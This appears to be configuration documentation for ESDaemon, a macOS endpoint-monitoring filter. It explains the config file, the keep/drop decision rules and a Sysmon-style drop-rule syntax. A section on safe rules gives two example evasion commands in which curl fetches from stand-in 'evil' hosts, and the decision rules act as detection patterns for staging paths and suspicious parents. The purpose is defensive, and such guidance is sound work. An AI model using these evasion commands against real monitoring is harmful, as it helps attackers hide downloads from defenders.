# Configuring ESDaemon

One file controls everything: **`/usr/local/ESDaemon/configs/ESDaemon.cfg`**. The repo copy (`configs/ESDaemon.cfg`) is the default that `install.sh` writes only when no config exists yet. Re-running the installer never overwrites your changes.

## The edit loop

```bash
sudo nano /usr/local/ESDaemon/configs/ESDaemon.cfg        # 1. edit
/usr/local/ESDaemon/cfg.sh /usr/local/ESDaemon/configs/ESDaemon.cfg json >/dev/null && echo ok   # 2. validate
/usr/local/ESDaemon/try.sh /path/to/raw.ndjson            # 3. optional dry-run against a capture
sudo /usr/local/ESDaemon/reload.sh                        # 4. apply (refuses an invalid cfg)
```

`reload.sh` regenerates both LaunchDaemons from the cfg and restarts both. Events are missed for a few seconds during the restart.

## File format

- `[section]` headers, one value per line, and `#` for comments. Blank lines are ignored.
- `[settings]` holds `key = value` lines. Every other section is a plain list.
- Names in the binary lists match the **basename** of the launched binary (`curl` matches `/usr/bin/curl` and `/opt/homebrew/bin/curl`). Case-sensitive.

## Sections

| Section | What a line means |
|---|---|
| `[settings]` | `events`, `subsystem`, `category`, `format`, `third_party` (see below) |
| `[always]` | always keep launches of this binary |
| `[download]` | same as `[always]`, kept separate for readability: Apple tools that fetch or move data |
| `[conditional]` | keep only if the command line looks risky, the parent is interesting, or a shell reads its script from stdin |
| `[drop]` | drop launches matching Sysmon-style clauses (`Image is … AND CommandLine contains …`). Overrides every keep rule. |
| `[noisy_team_ids]` | with `third_party = drop_noisy`: drop binaries signed by these Team IDs |
| `[noisy_path_prefixes]` | drop when the launched binary **or its parent** lives under this path |

### `[settings]`

| Key | Values | Default |
|---|---|---|
| `events` | eslogger event names, space separated: `exec create rename btm_launch_item_add xp_malware_detected sudo authentication setextattr mount` … | `exec` |
| `subsystem` / `category` | unified-log destination | `com.apple.eslogger` / `events` (eslogger's own, so the Bindplane predicate stays the same) |
| `format` | `sysmon`, `sysmon+extras`, `slim`, `raw` | `sysmon+extras` |
| `third_party` | `all` (keep every non-Apple exec) or `drop_noisy` (apply `[noisy_team_ids]`) | `all` |

## How a launch is decided (first match wins)

1. `[drop]` rule matches → **drop**
2. binary or parent under `[noisy_path_prefixes]` → **drop**
3. `third_party = drop_noisy` and signed by a `[noisy_team_ids]` vendor → **drop**
4. binary runs from /tmp, /private/var/folders, /Users/Shared, /Volumes, Downloads, a hidden App Support folder, /.com.apple.*, Library/Caches → **keep**
5. Apple platform binary running from outside the system folders (a copy) → **keep**
6. not an Apple platform binary (third-party, unsigned, ad-hoc) → **keep**
7. basename in `[always]` or `[download]` → **keep**
8. basename in `[conditional]` → **keep only if** the command line is risky, the parent is interesting, or it's a shell reading from stdin
9. parent is osascript, curl, bun, an unsigned binary, or a binary running from a staging path → **keep**
10. anything else → **drop**

Rules 4, 5, 6 and 9 are built into `src/scope.jq`. They are the curated-rule logic, not tuning knobs, but `[drop]` can still override any of them.

## Common changes

**Add a binary to always capture.** Put its basename under `[always]` (or `[download]` for network tools):
```
[always]
kubectl
```

**Capture a chatty binary only when it's doing something suspicious.** Move it from `[always]` to `[conditional]`.

**Stop capturing a binary completely.** Delete it from `[always]`, `[download]` and `[conditional]`. An Apple platform binary on no list is then dropped. A **third-party** binary is still kept by rule 6, so drop it with `[drop]`:
```
[drop]
Image image "Microsoft AutoUpdate"
```

**Drop one noisy command line but keep the binary.** See the next section.

**Drop a whole vendor.** Set `third_party = drop_noisy` and add its Team ID (`codesign -dv /Applications/X.app 2>&1 | grep TeamIdentifier`) under `[noisy_team_ids]`. Only binaries signed by that vendor are dropped. A shell or curl they launch is still judged on its own. For a one-off, `TeamId is <ID>` in `[drop]` does the same without switching modes.

**Silence a tool and everything it launches.** Add its install path under `[noisy_path_prefixes]`, e.g. `/opt/observiq-otel-collector/`.

## `[drop]` rules

The syntax uses Sysmon's own filter words, so anyone who has written a Sysmon config can read it. Each line is one rule:

```
<Field> <condition> <value>  [AND <Field> <condition> <value> ...]
```

- **Every clause on a line must match** (AND). **Separate lines are alternatives** (OR).
- Matching is **case-insensitive**, like Sysmon.
- A rule on a field the event doesn't carry never matches. For example, `ParentCommandLine` is unknown when the parent started before ESDaemon, so unknown data never causes a drop.

**Fields** (the same names you see in the output):

| Field | Is |
|---|---|
| `Image` | full path of the launched binary |
| `CommandLine` | its command line, as shown in the output |
| `ParentImage` | full path of the parent |
| `ParentCommandLine` | parent's command line (only if the parent's own launch was seen) |
| `User` | user name (from `USER`) or `uid:N` |
| `TeamId`, `SigningId` | code-signing identity of the launched binary |

**Conditions** (same meaning as in Sysmon):

| Condition | Matches when the field… |
|---|---|
| `is` / `is not` | equals / differs from the value |
| `is any` | equals one of `a;b;c` |
| `contains` / `excludes` | contains / doesn't contain the value |
| `contains any` / `contains all` | contains one / all of `a;b;c` |
| `excludes any` / `excludes all` | misses one / all of `a;b;c` |
| `begin with` / `not begin with` | starts / doesn't start with the value |
| `end with` / `not end with` | ends / doesn't end with the value |
| `image` | is that full path **or** has that file name (`curl` matches `/usr/bin/curl`) |
| `regex` | matches the regular expression |

**Values** run to the next `AND` or the end of the line. Put a value in double quotes if it contains the word `AND`, or has spaces at either end. A lowercase `and` inside a value is fine.

**Examples**
```
[drop]
Image is /usr/bin/curl AND CommandLine begin with "curl -s https://updates.example.com/"
Image is /usr/local/bin/jamf AND CommandLine is "/usr/local/bin/jamf policy -event recurring"
ParentImage is /usr/local/bin/jamf AND Image image sh AND CommandLine contains "jamf inventory"
TeamId is any UBF8T346G9;EQHXZ8M8AV
User is _spotlight AND Image image mdworker_shared
Image image python3 AND CommandLine regex ^python3 /opt/corp/[a-z]+\.py$
```

**Mistakes are caught before anything runs.** An unknown field, an unknown condition, a bad regex, a dangling `AND` or free text makes `cfg.sh` and `reload.sh` fail with the offending line, and the running daemon is left as it was.

## Writing safe drop rules

The command line is **attacker-controlled**, so a loose rule is a free hiding place:

| Rule | Problem |
|---|---|
| `CommandLine contains jamf` | any command mentioning "jamf" disappears, e.g. `curl evil.sh -o /tmp/jamf` |
| `Image image curl AND CommandLine contains updates.example.com` | `curl https://evil/x -H updates.example.com` disappears |
| `Image is /usr/bin/curl AND CommandLine is "curl -s https://updates.example.com/a.pkg"` | fine: exact binary, exact command line |

Prefer `Image is <full path>` over `image <name>`, and prefer `is` / `begin with` over `contains`. Test each rule with `try.sh` against a real capture and check that the kept count drops only by what you meant to drop.
## Limits

- Filtering sees the command line at launch time. A download done **inside** a script (`python3 fetch.py`) is invisible unless the script path itself is suspicious.
- `ParentCommandLine` is only known for parents launched after ESDaemon started.
- Network connections are not an eslogger event. Use DNS/proxy telemetry for them.
